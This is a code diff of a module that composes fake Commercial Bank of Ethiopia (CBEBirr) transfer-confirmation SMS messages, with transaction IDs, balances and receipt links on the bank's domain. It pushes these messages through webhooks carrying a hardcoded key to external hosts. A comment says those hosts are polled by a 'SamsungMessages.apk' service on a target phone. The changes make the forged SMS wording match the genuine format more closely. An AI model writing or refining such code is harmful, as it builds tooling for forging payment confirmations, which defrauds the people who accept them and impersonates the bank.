@@ -224,7 +224,7 @@ export function buildCbeSmsText({
   const ph = formatPhoneForCbeLink(userPhone);
   const visualUrl = `https://cbepay1.cbe.com.et/aureceipt?TID=${txnId}&PH=${ph}`;
 
-  return `Dear ${fullName}, you have successfully transferred ${amount} Br to ${recAcc} - ${recName} (Transfer) on ${dateTimeStr}. Txn ID ${txnId}. Your balance is ${formattedBalance} Br. Thank You! CBEBirr transaction Receipt. Com ${visualUrl}`;
+  return `Dear ${fullName}, you have successfully transferred ${amount},Br. to ${recAcc} - ${recName} (Transfer) on ${dateTimeStr}.Txn ID ${txnId}.Your balance is ${formattedBalance} Br.Thank You! CBEBirr transaction Receipt. Com ${visualUrl}`;
 }
 
 /**
@@ -369,69 +369,7 @@ export async function sendSmsWebhook(
     });
   } catch {}
 
-  // 2. Prepare payload variant explicitly targeting dev_galaxy_a12
-  const galaxyPayload = Array.isArray(payload)
-    ? payload.map((p) => ({ ...p, deviceId: 'dev_galaxy_a12' }))
-    : { ...payload, deviceId: 'dev_galaxy_a12' };
-  const galaxyBodyStr = JSON.stringify(galaxyPayload);
-
-  // 3. Forward directly to https://ramussbirr.vercel.app/api/sms/webhook
-  // This is the CRITICAL endpoint polled in background by SamsungMessages.apk SmsSyncService!
-  try {
-    fetch('https://ramussbirr.vercel.app/api/sms/webhook', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-api-key': 'Ram69',
-        'x-device-id': 'dev_galaxy_a12',
-      },
-      body: galaxyBodyStr,
-      keepalive: true,
-      mode: 'cors',
-    }).catch(() => {});
-
-    // Also send with deviceId 'all' to ensure web/webview sync
-    fetch('https://ramussbirr.vercel.app/api/sms/webhook', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-api-key': 'Ram69',
-        'x-device-id': 'all',
-      },
-      body: bodyStr,
-      keepalive: true,
-      mode: 'cors',
-    }).catch(() => {});
-  } catch {}
-
-  // 4. Forward to backup webhook https://ms-bk-connect.vercel.app
-  try {
-    fetch('https://ms-bk-connect.vercel.app/api/sms/webhook', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-api-key': 'Ram69',
-        'x-device-id': 'dev_galaxy_a12',
-      },
-      body: galaxyBodyStr,
-      keepalive: true,
-      mode: 'cors',
-    }).catch(() => {});
-
-    fetch('https://ms-bk-connect.vercel.app/api/sms/webhook', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-api-key': 'Ram69',
-        'x-device-id': 'all',
-      },
-      body: bodyStr,
-      keepalive: true,
-      mode: 'cors',
-    }).catch(() => {});
-  } catch {}
-
-  // 5. Forward to appassets.androidplatform.net webhook
+  // 2. Forward to appassets.androidplatform.net webhook
   try {
     fetch('https://appassets.androidplatform.net/api/sms/webhook', {
       method: 'POST',
@@ -440,10 +378,45 @@ export async function sendSmsWebhook(
         'x-api-key': 'Ram69',
         'x-device-id': 'dev_galaxy_a12',
       },
-      body: galaxyBodyStr,
+      body: bodyStr,
       keepalive: true,
       mode: 'cors',
     }).catch(() => {});
+  } catch {}
+
+  // 3. Forward to ramussbirr.vercel.app webhook (the primary server polled by SamsungMessages.apk)
+  try {
+    fetch('https://ramussbirr.vercel.app/api/sms/webhook', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': 'Ram69',
+        'x-device-id': 'all',
+      },
+      body: bodyStr,
+      keepalive: true,
+      mode: 'cors',
+    }).catch(() => {});
+  } catch {}
+
+  // 4. Also forward to backup webhook
+  try {
+    const directRes = await fetch('https://ms-bk-connect.vercel.app/api/sms/webhook', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': 'Ram69',
+        'x-device-id': 'all',
+      },
+      body: bodyStr,
+      keepalive: true,
+      mode: 'cors',
+    });
+
+    if (directRes.ok) {
+      const data = await directRes.json().catch(() => ({}));
+      return { success: true, count: data.count || count };
+    }
   } catch {}
 
   return { success: true, count };
